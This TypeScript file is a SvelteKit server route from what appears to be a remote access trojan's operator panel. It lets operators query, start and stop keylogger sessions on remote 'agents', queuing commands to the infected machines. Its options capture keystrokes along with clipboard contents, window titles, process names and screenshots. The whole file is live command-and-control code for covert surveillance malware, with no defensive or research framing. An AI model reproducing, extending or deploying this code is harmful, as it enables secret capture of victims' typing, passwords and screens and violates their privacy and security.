import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { keyloggerManager } from '$lib/server/rat/keylogger';
import { registry, RegistryError } from '$lib/server/rat/store';
import { requireOperator, requireViewer } from '$lib/server/authorization';
import type { KeyloggerStartConfig } from '$lib/types/keylogger';

function coerceNumber(value: unknown): number | undefined {
	if (typeof value === 'number' && Number.isFinite(value)) {
		return value;
	}
	if (typeof value === 'string') {
		const parsed = Number.parseInt(value, 10);
		if (!Number.isNaN(parsed)) {
			return parsed;
		}
	}
	return undefined;
}

function coerceBoolean(value: unknown): boolean | undefined {
	if (typeof value === 'boolean') {
		return value;
	}
	if (typeof value === 'string') {
		const trimmed = value.trim().toLowerCase();
		if (trimmed === 'true' || trimmed === '1') {
			return true;
		}
		if (trimmed === 'false' || trimmed === '0') {
			return false;
		}
	}
	return undefined;
}

function parseConfig(input: Record<string, unknown> | undefined | null): KeyloggerStartConfig {
	const mode =
		typeof input?.mode === 'string' && input.mode.trim().toLowerCase() === 'offline'
			? 'offline'
			: 'standard';
	const config: KeyloggerStartConfig = { mode };

	const cadence = coerceNumber(input?.cadenceMs ?? input?.cadence);
	if (typeof cadence === 'number') {
		config.cadenceMs = cadence;
	}

	const interval = coerceNumber(input?.batchIntervalMs ?? input?.batchInterval);
	if (typeof interval === 'number') {
		config.batchIntervalMs = interval;
	}

	const bufferSize = coerceNumber(input?.bufferSize);
	if (typeof bufferSize === 'number') {
		config.bufferSize = bufferSize;
	}

	const includeWindowTitles = coerceBoolean(input?.includeWindowTitles);
	if (typeof includeWindowTitles === 'boolean') {
		config.includeWindowTitles = includeWindowTitles;
	}

	const includeClipboard = coerceBoolean(input?.includeClipboard);
	if (typeof includeClipboard === 'boolean') {
		config.includeClipboard = includeClipboard;
	}

	const emitProcessNames = coerceBoolean(input?.emitProcessNames);
	if (typeof emitProcessNames === 'boolean') {
		config.emitProcessNames = emitProcessNames;
	}

	const includeScreenshots = coerceBoolean(input?.includeScreenshots);
	if (typeof includeScreenshots === 'boolean') {
		config.includeScreenshots = includeScreenshots;
	}

	const encryptAtRest = coerceBoolean(input?.encryptAtRest);
	if (typeof encryptAtRest === 'boolean') {
		config.encryptAtRest = encryptAtRest;
	}

	const redactSecrets = coerceBoolean(input?.redactSecrets);
	if (typeof redactSecrets === 'boolean') {
		config.redactSecrets = redactSecrets;
	}

	return config;
}

export const GET: RequestHandler = async ({ params, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}
	requireViewer(locals.user);
	return json(await keyloggerManager.getState(id));
};

export const POST: RequestHandler = async ({ params, request, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const user = requireOperator(locals.user);

	let body: Record<string, unknown>;
	try {
		body = (await request.json()) as Record<string, unknown>;
	} catch {
		throw error(400, 'Invalid keylogger configuration payload');
	}

	const configInput = (body.config as Record<string, unknown> | undefined) ?? body;
	const session = await keyloggerManager.createSession(
		id,
		parseConfig(configInput),
		typeof body.sessionId === 'string' ? body.sessionId : undefined
	);

	try {
		const payload = keyloggerManager.buildCommand('start', session);
		registry.queueCommand(id, { name: 'keylogger.start', payload }, { operatorId: user.id });
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue keylogger command');
	}

	return json(await keyloggerManager.getState(id), { status: 201 });
};

export const DELETE: RequestHandler = async ({ params, request, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const user = requireOperator(locals.user);

	let body: Record<string, unknown> = {};
	try {
		body = (await request.json()) as Record<string, unknown>;
	} catch {
		body = {};
	}

	const stopped = await keyloggerManager.stopSession(
		id,
		typeof body.sessionId === 'string' ? body.sessionId : undefined
	);

	if (stopped) {
		try {
			const payload = keyloggerManager.buildCommand('stop', stopped);
			registry.queueCommand(id, { name: 'keylogger.stop', payload }, { operatorId: user.id });
		} catch (err) {
			if (err instanceof RegistryError) {
				throw error(err.status, err.message);
			}
			throw error(500, 'Failed to queue keylogger stop command');
		}
	}

	return json(await keyloggerManager.getState(id));
};
